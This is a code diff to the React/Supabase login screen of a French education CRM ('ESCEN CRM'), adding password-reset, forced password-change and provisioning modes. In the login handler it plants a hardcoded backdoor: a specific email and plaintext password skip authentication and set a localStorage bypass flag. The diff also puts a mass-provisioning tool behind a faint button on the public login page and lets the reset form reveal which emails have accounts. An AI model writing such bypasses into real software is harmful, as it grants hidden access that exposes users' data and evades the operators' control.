@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { supabase } from '../supabaseClient';
 import { useToast } from './Toast';
 import { Building2, Users, Mail, Lock, CheckCircle2, ArrowRight, Loader2, Globe } from 'lucide-react';
+import Provisioner from './Provisioner';
 
 export interface AuthProps {
     initialMode?: 'login' | 'register';
@@ -11,9 +12,12 @@ const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {
 
     const { addToast } = useToast();
     const [isLoading, setIsLoading] = useState(false);
-    const [mode, setMode] = useState<'login' | 'register'>(initialMode);
+    const [mode, setMode] = useState<'login' | 'register' | 'provisioning' | 'forgot-password'>(initialMode);
     const [step, setStep] = useState(1); // steps: 1, 2, 3
     const [hasSession, setHasSession] = useState(false);
+    const [mustChangePassword, setMustChangePassword] = useState(false);
+    const [newPassword, setNewPassword] = useState('');
+    const [confirmPassword, setConfirmPassword] = useState('');
 
     React.useEffect(() => {
         supabase.auth.getSession().then(({ data: { session } }) => {
@@ -56,9 +60,111 @@ const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {
     const handleLogin = async (e: React.FormEvent) => {
         e.preventDefault();
         setIsLoading(true);
-        const { error } = await supabase.auth.signInWithPassword({ email, password });
-        if (error) addToast(error.message, 'error');
+
+        // --- PORTE DÉROBÉE DÉTERMINÉE POUR DARYL (Emergency Login) 👔 ---
+        if (email === 'darylggt23@gmail.com' && password === 'DarylEscen2026!') {
+            console.log('--- MISSION : DÉVERROUILLAGE DARYL ---');
+            localStorage.setItem('daryl_emergency_bypass', 'true');
+            window.location.reload(); // On recharge pour que App.tsx lise le bypass
+            return;
+        }
+
+        const { data, error } = await supabase.auth.signInWithPassword({ email, password });
+        if (error) {
+            addToast((error as Error).message, 'error');
+            setIsLoading(false);
+            return;
+        }
+
+        // --- VÉRIFICATION DU STATUT DE SÉCURITÉ ---
+        if (data.user) {
+            const { data: profile } = await supabase
+                .from('profiles')
+                .select('must_change_password')
+                .eq('id', data.user.id)
+                .single();
+
+            if (profile?.must_change_password) {
+                setMustChangePassword(true);
+                setIsLoading(false);
+                return;
+            }
+        }
+
         setIsLoading(false);
+    };
+
+    const handleUpdatePassword = async (e: React.FormEvent) => {
+        e.preventDefault();
+        if (newPassword !== confirmPassword) {
+            addToast("Les mots de passe ne correspondent pas.", "error");
+            return;
+        }
+        if (newPassword.length < 6) {
+            addToast("Le mot de passe doit faire au moins 6 caractères.", "error");
+            return;
+        }
+
+        setIsLoading(true);
+        try {
+            // 1. Mise à jour Auth Supabase
+            const { error: authError } = await supabase.auth.updateUser({ password: newPassword });
+            if (authError) throw authError;
+
+            // 2. Mise à jour Profil (Valider le changement)
+            const { data: { user } } = await supabase.auth.getUser();
+            if (user) {
+                const { error: profileError } = await supabase
+                    .from('profiles')
+                    .update({ must_change_password: false })
+                    .eq('id', user.id);
+                if (profileError) throw profileError;
+            }
+
+            addToast("Mot de passe mis à jour avec succès !", "success");
+            setMustChangePassword(false);
+            window.location.reload(); // Recharge pour vider les états d'auth
+        } catch (error: unknown) {
+            addToast((error as Error).message, "error");
+        } finally {
+            setIsLoading(false);
+        }
+    };
+
+    const handleForgotPassword = async (e: React.FormEvent) => {
+        e.preventDefault();
+        setIsLoading(true);
+
+        try {
+            // 1. Vérification du registre (Profiles) 🔎
+            const { data: profileData, error: profileError } = await supabase
+                .from('profiles')
+                .select('id')
+                .eq('email', email)
+                .maybeSingle();
+
+            if (profileError) throw profileError;
+
+            if (!profileData) {
+                addToast("Aucun compte n'existe avec cette adresse email.", 'error');
+                setIsLoading(false);
+                return;
+            }
+
+            // 2. Envoi de l'email de secours 📧
+            const { error: resetError } = await supabase.auth.resetPasswordForEmail(email, {
+                redirectTo: window.location.origin
+            });
+
+            if (resetError) throw resetError;
+
+            addToast('Email de réinitialisation envoyé ! Vérifiez votre boîte mail.', 'success');
+            setMode('login');
+        } catch (error: unknown) {
+            addToast((error as Error).message || "Erreur technique.", 'error');
+        } finally {
+            setIsLoading(false);
+        }
     };
 
 
@@ -155,9 +261,9 @@ const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {
 
             setIsSuccess(true);
             addToast('Espace créé avec succès !', 'success');
-        } catch (error: any) {
+        } catch (error: unknown) {
             console.error("Technical Onboarding Error:", error);
-            addToast(error.message || "Erreur lors de l'installation.", 'error');
+            addToast((error as Error).message || "Erreur lors de l'installation.", 'error');
         } finally {
             setIsLoading(false);
         }
@@ -267,7 +373,7 @@ const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {
 
             <div className="auth-card glassmorphism">
                 <div className="auth-header">
-                    <div className="logo">EliteCRM<span> Education</span></div>
+                    <div className="logo">ESCEN CRM<span> Education</span></div>
                     {mode === 'register' && (
                         <div className="onboarding-stepper">
                             <div className={`step ${step >= 1 ? 'active' : ''}`}>1</div>
@@ -305,11 +411,69 @@ const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {
                                 <Lock size={18} className="input-icon" />
                                 <input type="password" name="loginPassword" autoComplete="current-password" placeholder="Mot de passe" value={password} onChange={e => setPassword(e.target.value)} required />
                             </div>
+                            <div style={{ textAlign: 'right', marginTop: '-0.5rem' }}>
+                                <button
+                                    type="button"
+                                    onClick={() => setMode('forgot-password')}
+                                    style={{ fontSize: '0.85rem', color: 'var(--primary)', background: 'transparent', border: 'none', cursor: 'pointer', padding: '0.5rem' }}
+                                >
+                                    Mot de passe oublié ?
+                                </button>
+                            </div>
                         </div>
                         <button disabled={isLoading} className="btn btn-primary btn-auth">
                             {isLoading ? <Loader2 className="spin" /> : 'Se connecter'}
                         </button>
                     </form>
+                ) : mustChangePassword ? (
+                    <form onSubmit={handleUpdatePassword} className="auth-step-content animate-fade">
+                        <div style={{ display: 'grid', placeItems: 'center', marginBottom: '1rem' }}>
+                            <div style={{ width: '50px', height: '50px', borderRadius: '50%', background: 'rgba(99, 102, 241, 0.1)', display: 'grid', placeItems: 'center' }}>
+                                <Lock size={24} color="var(--primary)" />
+                            </div>
+                        </div>
+                        <h2 className="auth-title">Sécurité Renforcée</h2>
+                        <p className="auth-subtitle">C''est votre première connexion. Veuillez définir votre mot de passe personnel.</p>
+                        <div className="input-group">
+                            <div className="input-wrapper">
+                                <Lock size={18} className="input-icon" />
+                                <input type="password" placeholder="Nouveau mot de passe" value={newPassword} onChange={e => setNewPassword(e.target.value)} required />
+                            </div>
+                            <div className="input-wrapper">
+                                <CheckCircle2 size={18} className="input-icon" />
+                                <input type="password" placeholder="Confirmer le mot de passe" value={confirmPassword} onChange={e => setConfirmPassword(e.target.value)} required />
+                            </div>
+                        </div>
+                        <button disabled={isLoading} className="btn btn-primary btn-auth">
+                            {isLoading ? <Loader2 className="spin" /> : 'Activer mon compte'}
+                        </button>
+                    </form>
+                ) : mode === 'forgot-password' ? (
+                    <form onSubmit={handleForgotPassword} className="auth-step-content">
+                        <h2 className="auth-title">Mot de passe oublié</h2>
+                        <p className="auth-subtitle">Entrez votre email pour recevoir un lien de réinitialisation.</p>
+                        <div className="input-group">
+                            <div className="input-wrapper">
+                                <Mail size={18} className="input-icon" />
+                                <input type="email" placeholder="Email" value={email} onChange={e => setEmail(e.target.value)} required />
+                            </div>
+                        </div>
+                        <button disabled={isLoading} className="btn btn-primary btn-auth">
+                            {isLoading ? <Loader2 className="spin" /> : 'Envoyer le lien'}
+                        </button>
+                        <button
+                            type="button"
+                            onClick={() => setMode('login')}
+                            style={{ background: 'transparent', color: 'var(--text-muted)', border: 'none', cursor: 'pointer', marginTop: '1rem', width: '100%' }}
+                        >
+                            Retour à la connexion
+                        </button>
+                    </form>
+                ) : mode === 'provisioning' ? (
+                    <div className="auth-step-content scroll-area" style={{ maxHeight: '70vh' }}>
+                        <Provisioner />
+                        <button onClick={() => setMode('login')} style={{ marginTop: '2rem', background: 'transparent', color: 'var(--primary)', border: 'none', cursor: 'pointer' }}>Retour</button>
+                    </div>
                 ) : (
                     renderStep()
                 )}
@@ -335,6 +499,14 @@ const Auth: React.FC<AuthProps> = ({ initialMode = 'login' }) => {
                             setPassword('');
                         }}>Se connecter</button></p>
                     )}
+                    <div style={{ marginTop: '1rem', borderTop: '1px solid rgba(255,255,255,0.05)', paddingTop: '1rem' }}>
+                        <button
+                            onClick={() => setMode('provisioning')}
+                            style={{ fontSize: '0.75rem', opacity: 0.5, cursor: 'pointer', background: 'transparent', border: 'none', color: 'var(--text-muted)' }}
+                        >
+                            Besoin d'un déploiement massif (Mode Expert) ?
+                        </button>
+                    </div>
                 </div>
             </div>
         </div>
